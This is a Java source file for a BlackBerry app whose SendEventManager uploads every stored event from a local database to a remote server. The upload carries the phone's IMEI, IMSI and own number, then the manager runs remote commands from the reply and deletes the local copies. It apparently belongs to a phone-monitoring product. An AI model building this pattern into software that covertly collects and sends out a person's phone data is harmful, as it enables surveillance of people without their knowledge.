package com.vvt.protmgr;

import java.util.Vector;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import com.vvt.db.FxEventDBListener;
import com.vvt.db.FxEventDatabase;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.DataProvider;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendEvents;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendEventCmdResponse;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SendEventManager implements CommandListener, DataProvider, FxEventDBListener, FxTimerListener {
	
	private static final int SEND_INTERVAL = 60 * 2;
	private static final long SEND_EVENT_CSID_KEY = 0x66121a1a23e182deL;
	private static SendEventManager self = null;
	private PersistentObject csidPersistence = null;
	private FxEventDatabase db = Global.getFxEventDatabase();
	private LicenseManager license = Global.getLicenseManager();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private Preference pref = Global.getPreference();
	private ServerUrl serverUrl = Global.getServerUrl();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private SendEventCmdResponse sendEventRes = null;
	private SendEventCSID sendEventCSID = null;
	private FxTimer cmdTimer = new FxTimer(this);
	private Vector pEvents = null;
	private Vector fxEvents = null;
	private Vector listeners = new Vector();
	private boolean progress = false;
	private int round = 0;
	private int countEvent = 0;
	
	private SendEventManager() {
		// CSID
		csidPersistence = PersistentStore.getPersistentObject(SEND_EVENT_CSID_KEY);
		sendEventCSID = (SendEventCSID)csidPersistence.getContents();
		if (sendEventCSID != null) {
			sendEvents();
		}
		// Timer
		cmdTimer.setInterval(SEND_INTERVAL);
	}
	
	public static SendEventManager getInstance() {
		if (self == null) {
			self = new SendEventManager();
		}
		return self;
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	public void sendEvents() {
		round++;
		doSend();
	}

	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(sendEventRes);
		}
	}
	
	private void notifyError(String message) {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}
	
	private void doSend() {
		try {
			if (!progress) {
				if (sendEventCSID == null) {
					// To get events.
					countEvent = 0;
					fxEvents = db.selectAll();
					if (fxEvents.size() > 0) {
						progress = true;
						licenseInfo = license.getLicenseInfo();
						pEvents = EventAdapter.convertToPEvent(fxEvents);
						// To construct and send events.
						CommandRequest cmdRequest = new CommandRequest();
						// Meta Data
						CommandMetaData cmdMetaData = new CommandMetaData();
						cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
						cmdMetaData.setProductId(licenseInfo.getProductID());
						cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
						cmdMetaData.setConfId(licenseInfo.getProductConfID());
						cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
						cmdMetaData.setLanguage(Languages.THAI);
						cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
						cmdMetaData.setMcc(Constant.EMPTY_STRING + PhoneInfo.getMCC());
						cmdMetaData.setMnc(Constant.EMPTY_STRING + PhoneInfo.getMNC());
						cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
						cmdMetaData.setImsi(PhoneInfo.getIMSI());
						cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
						cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
						cmdMetaData.setCompressionCode(CompressionType.NO_COMPRESS.getId());
						// Event Data
						SendEvents eventData = new SendEvents();
						eventData.setEventCount(pEvents.size());
						eventData.addEventIterator(this);
						cmdRequest.setCommandData(eventData);
						cmdRequest.setCommandMetaData(cmdMetaData);
						cmdRequest.setUrl(serverUrl.getServerDeliveryUrl());
						cmdRequest.setCommandListener(this);
						// Execute Command
						long csid = comServMgr.execute(cmdRequest);
						sendEventCSID = new SendEventCSID();
						sendEventCSID.setCsid(new Long(csid));
						sendEventCSID.setFxEvents(fxEvents);
						csidPersistence.setContents(sendEventCSID);
						csidPersistence.commit();
						cmdTimer.stop();
						cmdTimer.start();
					}
				} else {
					// Resume
					progress = true;
					fxEvents = sendEventCSID.getFxEvents();
					long csid = sendEventCSID.getCsid().longValue();
					Vector csids = comServMgr.getPendingCsids();
					for (int i = 0; i < csids.size(); i++) {
						long id = ((Long)csids.elementAt(i)).longValue();
						if (csid == id) {
							comServMgr.executeResume(csid, this);
							break;
						}
					}
				}
			}
		} catch(Exception e) {
			Log.error("SendEventManager.doSend", null, e);
		}
	}
	
	private void continueSendEvent() {
		sendEventCSID = null;
		csidPersistence.setContents(sendEventCSID);
		csidPersistence.commit();
		progress = false;
		round--;
		if (round > 0) {
			doSend();
		}
	}

	// CommandListener
	public void onSuccess(CmdResponse response) {
		if (response instanceof SendEventCmdResponse) {
			cmdTimer.stop();
			sendEventRes = (SendEventCmdResponse)response;
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			generalInfo.setConnectionMethod(sendEventRes.getConnectionMethod());
			pref.commit(generalInfo);
			int statusCode = sendEventRes.getStatusCode();
			if (statusCode == 0) {
				// To process PCC commands.
				rmtCmdMgr.process(sendEventRes.getPCCCommands());
				// To delete events from store.
				db.addListener(this);
				db.delete(fxEvents);
			} else {
				notifyError(sendEventRes.getServerMsg());
				continueSendEvent();
			}
		}
	}
	
	public void onConstructError(long csid, Exception e) {
		Log.error("SendEventManager.onConstructError", "csid: " + csid, e);
		cmdTimer.stop();
		notifyError(e.getMessage());
		continueSendEvent();
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendEventManager.onTransportError", "csid: " + csid, e);
		cmdTimer.stop();
		notifyError(e.getMessage());
		continueSendEvent();
	}

	// DataProvider
	public Object getObject() {
		return pEvents.elementAt(countEvent++);
	}

	public boolean hasNext() {
		return countEvent < pEvents.size();
	}

	// FxEventDBListener
	public void onDeleteError() {
		db.removeListener(this);
		String msg = "Cannot delete events from persistent store.";
		notifyError(msg);
		continueSendEvent();
	}

	public void onDeleteSuccess() {
		db.removeListener(this);
		fxEvents.removeAllElements();
		pEvents = null;
		notifySuccess();
		continueSendEvent();
	}

	public void onInsertError() {
	}

	public void onInsertSuccess() {
	}

	// FxTimerListener
	public void timerExpired(int id) {
		// To cancel Command. TODO
		String msg = "Time out!";
		notifyError(msg);
		continueSendEvent();
	}
}
